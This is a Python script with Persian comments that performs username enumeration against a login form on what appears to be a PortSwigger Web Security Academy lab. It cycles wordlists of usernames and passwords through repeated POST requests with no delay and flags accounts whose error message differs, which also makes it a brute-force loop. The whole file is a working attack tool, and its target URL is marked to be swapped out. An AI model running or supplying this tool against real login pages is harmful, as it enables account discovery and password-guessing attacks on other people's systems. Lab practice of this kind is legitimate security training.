import requests
import time

# ================== تنظیمات ==================
LOGIN_URL = "https://0af000960475e6c381507527008900d0.web-security-academy.net/login"  # حتماً عوض کن

USERNAME_LIST = "usernames.txt"   # لیست یوزرنیم‌ها
PASSWORD_LIST = "passwords.txt"   # لیست پسوردها (حتی یک پسورد هم کافیه)

# پسورد تست (معمولاً یک پسورد غلط ثابت بهتره)
TEST_PASSWORD = "wrongpassword"   # یا از لیست استفاده می‌کنه

MAX_TRIES_PER_USER = 5            # تعداد تست برای هر یوزرنیم
DELAY = 0                        # تأخیر بین درخواست‌ها (ثانیه)

# رشته‌هایی که برای تشخیص ارور استفاده می‌کنیم
NORMAL_ERROR = "Invalid username or password"   # ارور استاندارد
# اگر ارور متفاوتی دیدی، اینجا اضافه کن
DIFFERENT_ERRORS = ["Account locked", "Invalid username", "password", "too many"]

session = requests.Session()

def try_login(username, password):
    data = {
        "username": username,
        "password": password
    }
    try:
        response = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=10)
        return response.text, response.status_code
    except:
        return "Request failed", 0

print("start Username Enumeration...\n")

candidates = []

with open(USERNAME_LIST, "r", encoding="utf-8") as f:
    usernames = [line.strip() for line in f if line.strip()]

with open(PASSWORD_LIST, "r", encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

for idx, username in enumerate(usernames, 1):
    print(f"[{idx}/{len(usernames)}] Testing username: {username}")
    
    different_response = False
    responses_seen = []
    
    for attempt in range(MAX_TRIES_PER_USER):
        # انتخاب پسورد 
        pwd = passwords[attempt % len(passwords)] if passwords else TEST_PASSWORD
        
        body, status = try_login(username, pwd)
        responses_seen.append(body[:300])  # فقط بخشی برای مقایسه
        
        if NORMAL_ERROR.lower() not in body.lower():
            print(f"    → Different response detected for {username} !")
            different_response = True
            break
        
        time.sleep(DELAY)
    
    if different_response:
        candidates.append(username)
        print(f"🎯 Possible valid username: {username}\n")
    else:
        print(f"    Normal error\n")

# نتیجه نهایی
print("="*60)
if candidates:
    print(f"✅ username found ({len(candidates)} number ):")
    for u in candidates:
        print(f"   → {u}")
    print("\nthese usernames has different error , one of them has right.")
else:
    print("not user name found ! check your list again !!!")

print("Done!")
